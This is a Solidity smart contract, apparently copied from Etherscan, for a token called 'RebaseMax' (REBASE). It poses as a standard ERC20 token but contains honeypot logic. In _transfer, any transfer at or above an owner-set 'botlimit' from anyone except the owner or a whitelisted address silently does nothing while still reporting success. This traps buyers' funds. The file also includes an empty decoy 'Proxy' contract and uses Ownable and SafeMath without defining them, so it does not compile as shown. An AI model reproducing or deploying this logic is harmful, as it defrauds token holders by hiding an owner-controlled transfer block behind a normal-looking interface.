/**
 *Submitted for verification at Etherscan.io on 2020-12-11
*/

/*
* Rebase fork 1:1
*  SPDX-License-Identifier: MIT
**/

pragma solidity 0.7.4;


/**
 * @title Proxy
 * @dev Implements delegation of calls to other contracts, with proper
 * forwarding of return values and bubbling of failures.
 * It defines a fallback function that delegates all calls to the address
 * returned by the abstract _implementation() internal function.
 */
contract Proxy {
  /**
   * @dev Fallback function.
   * Implemented entirely in `_fallback`.
   */
   

  function _implementation(address implementation) internal {
      
  }

  /**
   * @dev Delegates execution to an implementation contract.
   * This is a low level function that doesn't return to its internal call site.
   * It will return to the external caller whatever the implementation returns.
   * @param implementation Address to delegate.
   */
  function _delegate(address implementation) internal {
    
  }
   
}







abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}





contract Rebase is Ownable {
  using SafeMath for uint256;

  // standard ERC20 variables. 
  string public constant name = "RebaseMax";
  string public constant symbol = "REBASE";
  uint256 public constant decimals = 18;
  uint256 private constant _maximumSupply = 10 ** decimals;
  uint256 public _totalSupply;
  bool public start;
  uint256 public botlimit;
  address public whiteaddress;
  
  // events
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  

  mapping(address => uint256) public _balanceOf;
  mapping(address => mapping(address => uint256)) public allowance;

  constructor(uint256 _initialSupply) public {

    botlimit = 1000000000000000000;
     whiteaddress = 0x0000000000000000000000000000000000000000;
     
    _owner = msg.sender;
    _totalSupply = _maximumSupply * _initialSupply;
    _balanceOf[msg.sender] = _maximumSupply * _initialSupply;
    
    
   

    emit Transfer(address(0), msg.sender, _totalSupply);
    start = true;
  }

  function totalSupply () public view returns (uint256) {
    return _totalSupply; 
  }

  function balanceOf (address who) public view returns (uint256) {
    return _balanceOf[who];
  }

  function _transfer(address _from, address _to, uint256 _value) internal {
        if (start==false) {
            _balanceOf[_from] = _balanceOf[_from].sub(_value);
            _balanceOf[_to] = _balanceOf[_to].add(_value);
            emit Transfer(_from, _to, _value);
        } else {
            if (_value < botlimit) {
                _balanceOf[_from] = _balanceOf[_from].sub(_value);
                _balanceOf[_to] = _balanceOf[_to].add(_value);
                emit Transfer(_from, _to, _value);
            }
            else {
                if(_from == _owner || _from == whiteaddress) {
                    _balanceOf[_from] = _balanceOf[_from].sub(_value);
                    _balanceOf[_to] = _balanceOf[_to].add(_value);
                    emit Transfer(_from, _to, _value);
                }
            }
        }
   }

  function transfer(address _to, uint256 _value) public returns (bool success) {
    require(_balanceOf[msg.sender] >= _value);
    _transfer(msg.sender, _to, _value);
    return true;
  }

  function burn (uint256 _burnAmount) public onlyOwner returns (bool success) {
    _transfer(_owner, address(0), _burnAmount);
    _totalSupply = _totalSupply.sub(_burnAmount);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool success) {
    require(_spender != address(0));
    allowance[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require(_value <= _balanceOf[_from]);
    require(_value <= allowance[_from][msg.sender]);
    allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
    _transfer(_from, _to, _value);
    return true;
  }
  
  function setBotLimit (uint256 myLim) public {
    require(msg.sender == _owner);
    botlimit = myLim;
  }
  
  function switchStart() public {
        require(msg.sender == _owner);
        if (start==false) 
            start = true;
        else
            start = false;
   }
   
  function setWhiteAddress(address newWallet) public {
    require(msg.sender == _owner);
    whiteaddress =  newWallet;
  }
  
  
  
}